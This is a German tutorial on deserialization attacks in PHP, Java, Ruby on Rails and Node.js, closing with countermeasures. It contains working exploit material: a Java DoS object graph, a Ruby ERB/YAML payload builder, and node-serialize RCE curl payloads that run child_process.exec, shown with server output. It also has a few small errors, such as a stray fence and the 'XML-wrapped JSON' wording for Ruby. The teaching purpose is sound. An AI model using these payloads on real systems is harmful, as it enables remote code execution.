# Serialisierungsangriffe

Die Serialisierung dient dazu, aus einem Objekt einer Programmiersprache
zur Laufzeit eine Textrepresentation zu erstellen. Diese kann dann
gespeichert oder übertragen werden. Zu einem späteren Zeitpunkt kann aus
dieser Textrepresentation wieder ein Programmiersprachen-Objekt erstellt
und diese innerhalb einer Webapplikation verwendet werden.

Das grundsätzliche Problem ist, dass ein Angreifer das serialisierte
Dokument abfangen und modifizieren kann. Auf diese Weise kann er das
wieder-erstellte Objekte indirekt modifizieren oder auch während (oder
nach) der Deserialisierung Schadcode zur Ausführung bringen.

Hier ein einfaches Beispiel eines serialisierten Objekts in PHP (als
auch eines modifizierten serialisierten Objekts). Die Annahme ist, dass
ein Webserver die Daten des aktuellen Benutzers serialisiert, diese in
einer Browser-Session client-seitig speichert und bei jedem
Client-Zugriff das de-serialisierte Objekt verwendet um wieder das
User-Objekt zu bauen:

```pickle
# Serialisiertes Objekt
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}

# Modifiziertes Serialisiertes Objekt
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

In dem Beispiel wird ein einfaches Serialisierungsformat verwendet,
String Elemente werden in der Form *s:Länge:Inhalt* verwendet. Ein
Angreifer würde z.B. innerhalb des Browsers diese serialisierten Daten
modifizieren und z.B. aus dem String “user” (Länge 4) den String “admin”
(Länge 5) machen und versuchen auf diese Weise eine Privilege Escalation
durchzuführen.

Weitaus schwerwiegendere Angriffe sind ebenso möglich:

- Es gibt in PHP (wie in den meisten Programmiersprachen) Methoden,
  die automatisch beim Erstellen bzw. Vernichten von Objekten
  aufgerufen werden. Ein Angreifer kann anstatt (wie bei dem angegeben
  Beispiel) einen Stringwert zu verändern, den Stringwert mit einem
  serialisierten Objekt ersetzen. Dieses Objekt muss nur eine (bei der
  Serialisierung automatisch aufgerufene) Methode besitzen, die auf
  eine Variable zugreift und diese als Code ausführt. Der Angreifer
  würde im serialisierten Objekt nun den Wert dieser Variable auf den
  Schadcode setzen und dadurch beim Deserialisieren eine serverseitige
  Code-Execution erzeugen.

- Es können auch serialisierte Objekte mit Objektreferenzen gebaut
  werden. Problematisch ist, dass die referenzierten Objekte während
  der Deserialisierung auch Daten wieder freigeben können, man über
  die Objektreferenz allerdings noch auf diese zugreifen kann. Dies
  führt zu *use-after-free* Bugs die für *memory corruption*-basierte
  Angriffe ausgenutzt werden können.

## Serialisierungsangriffe in Java

Serialisierung innerhalb des Java-Ökosystems besitzt das Problem, dass
bei der Deserialisierung zuerst das de-serialisierte Objekt gebaut wird
und erst danach der Typ, etc. des Objekts überprüft werden kann. Hier
ein Beispiel:

```java
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
AcmeObject acme = (AcmeObject)ois.readObject();
```

Dies bedeutet, dass die Java-Laufzeitumgebung initial aus einem
nicht-vertrauenswürdigem Dokument ein neues Java-Objekt erstellen muss.
Ein Angreifer kann dies z.B. für einen einfachen DoS missbrauchen. So
erstellt folgender Java-Code z.B. mehrere Hashes die ineinander
verknüpft werden. Während solch ein Konstrukt gebaut und serialisiert
werden kann, ergibt dies eine rekursive Datenstruktur mit unendlichem
Speicherverbrauch beim Deserialisieren und bringt dadurch das Java
Runtime Environment zum Absturz:

```java
Set root = new HashSet();
Set s1 = root;
Set s2 = new HashSet();

for (int i = 0; i < 100; i++) {
  Set t1 = new HashSet();
  Set t2 = new HashSet();
  t1.add("foo"); // make it not equal to t2
  s1.add(t1);
  s1.add(t2);
  s2.add(t1);
  s2.add(t2);
  s1 = t1;
  s2 = t2;
}
```

## Serialisierungsangriffe in Ruby on Rails

Ruby (on Rails) besitzt eine längere Historie von
Deserialiserungsangriffen. Ein Beispiel hierfür verwendet die Rails
*ERB* Klasse. Diese Klasse besitzt ein Element src in welchem
Base64-codierter Source Code enthalten sein kann. Dieser Source Code
wird bei Aufruf der Methode *result* eines ERB-Objektes intern
aufgerufen.

Ruby verwendet ein in XML-eingepacktes JSON-Dokument als
Serialisierungsformat. Ein Angreifer könnte z.B. folgendes Dokument
bauen, welches einem serialisierten ERB Objekt entspricht:

```ruby
code  = File.read(ARGV[1])

# Construct a YAML payload wrapped in XML
payload = <<-PAYLOAD.strip.gsub("\n", "&#10;")
<fail type="yaml">
--- !ruby/object:ERB
 template:
    src: !binary |-
        #{Base64.encode64(code)}
</fail>
PAYLOAD
```

Der Code liest zuerst eine Payload aus einem File aus (der Pfad wird
durch die Variable ARGV bereitgestellt) und erstellt dann ein Dokument
welches ein serialisiertes ERB-Objekt beschreibt. Hier wurde nun src mit
dem Schadcode befüllt und falls die Webapplikation, welche dieses
serialisierte Objekt entgegen nimmt, nun das Objekt deserialisert und
auf die *result* Methode zugreift wird der bösartige Code des Angreifers
ausgeführt. Dies entspricht einer Remote Command Injection, basierend
auf einem Serialisierungsfehler.

## Serialisierungsangriffe in Javascript / Node.js

Ein schönes Beispiel für Serialisierungsangriffe ist folgende *node.js*
Applikation welche die Serialisierungsbibliothek *node-serialize*
verwendet:

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const serialize = require('node-serialize');

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));

app.post("/api/deserialize", function(req, res) {
    var str = ""+req.body.fubar;
      const todo = serialize.unserialize(str);
      console.log(todo);
      res.send("wohoo!");
});

const server = app.listen(3000, function() {
      console.log("Server started! (Express.js)");

        // Beispiel eines "normalen" serialisierten Objekts
        const normal = {
            todo: "some string"
        };
      console.log("serialized normal object" + serialize.serialize(normal));
});
```

Bei diesem Beispiel wird vom Server als Parameter ,,fubar” ein
serialisiertes Objekt als Text entgegen genommen, deserialisiert und
ausgegeben. Das erwartete serialisierte Object wird nun über das
Kommandozeilentool *curl* an den Server übertragen:

```text
    $ curl -X POST -d "fubar={\"todo\":\"some string\"}" http://localhost:3000/api/deserialize

    # Ausgabe am Server:
    Server started! (Express.js)
    serialized normal object: {"todo":"some string"}
    serialized attack code: {"todo":"_$$ND_FUNC$$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}"}

    { todo: 'some string' }
```

In Javascript kann eine Klasse/Objekt auch eine Funktion als Element
besitzen. Folgende Klasse inkludiert z.B. unter dem Namen ,,todo” nicht
ein Attribut, sondern eine ausführbare Funktion:

```javascript
// Beispiel eines serialisierten Objekts mit einer aufrufbaren Funktion
const todo = {
      todo : function() {
          // child_process kann verwendet werden um eine ausführbare Datei aufzurufen
          require('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})
      }
  };
```

Wird diese Klasse serialisiert, wird folgender serialisierter Text
erstellt:

```json
{"todo":"_$$ND_FUNC$$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}"}
```k

Dieser inkludiert das Ausführen eines Befehls (,,ls /bin”) in der
Hoffnung, dass beim deserialisieren dieser Befehl am Server aufgerufen
werden würde. Dieses Kommando wird nun ebenso über curl an den Server
übertragen:

```text
# Die Zeichen \ und $ mussten teilweise maskiert werden
$ curl -X POST -d "fubar={\"todo\":\"_\$\$ND_FUNC\$\$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}\"}" http://localhost:3000/api/deserialize

# Ausgabe am Server:

{ todo: [Function (anonymous)] }
```

Das Objekt wurde deserialisiert (inkl. der Methode mit dem Schadcode),
würde diese Methode während der Request-Abarbeitung aufgerufen werden,
würde unser Kommando am Server exekutiert werden. Wir können diesen
Exploit noch verbessern indem wir durch Anhängen von ,,()” nicht nur
eine Funktion definieren, sondern diese auch direkt aufrufen. Dies würde
folgendem serialiserten String bzw. folgendem Curl-Aufruf entsprechen:

```shell
# curl Aufruf
$ curl -X POST -d "fubar={\"todo\":\"_\$\$ND_FUNC\$\$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}()\"}" http://localhost:3000/api/deserialize
```

Die Ausgabe am Server zeigt nun, dass das Kommando ausgeführt, und der
Inhalt von */bin* ausgegeben wurde:

```text
    { todo: undefined }                                                                                                                         
    [                                                                                                                                           
    2to3-2.7                                                              
    aa-enabled                                                                                                                                  
    aa-exec                                                               
    aa-features-abi                                                       
    aconnect                                                              
    acpi_listen                                                           
    add-apt-repository                                                    
    addpart                                                               
    addr2line                                                             
    afm2pl                                                                
    afm2tfm                                                               
    ag                                                                    
    aleph
    ...
```

## Gegenmaßnahmen

Die Grundidee ist es, dass der Entwickler vor der Deserialisierung
definieren muss, welche validen Objekttypen bei der Deserialisierung
vorkommen dürfen. Wie und ob dies überhaupt möglich ist, ist allerdings
von der verwendeten Programmiersprache abhängig — z.B. muss bei älteren
Java-Versionen eine externe Serialisierungsbibliothek[5] verwendet
werden um ein sicheres Verhalten zu erzielen.

Zusätzlich müssen serialisierte Daten einer Integritätssicherung
unterzogen werden (z.B. mittels einer Signatur oder eines MACs) damit
ein Angreifer die serialisierten Daten nicht verändern kann.

Da diese Sicherungsmassnahmen teilweise schwer umsetzbar sind, empfiehlt
OWASP, dass Daten nur deserialisert werden dürfen, wenn diese aus einer
authentischen und integritäts-geschützen Quelle kommen. Dadurch wird
allerdings das Grundproblem nicht gelöst, sondern wird die Verantwortung
und das Problem nur zu dem Anwender, der die Deserialisierung anstößt,
verschoben. Falls ein Angreifer das Konto dieses Anwenders übernehmen
kann, erlangt er wiederum die Möglichkeit eine Deserialisierungattacke
durchzuführen.
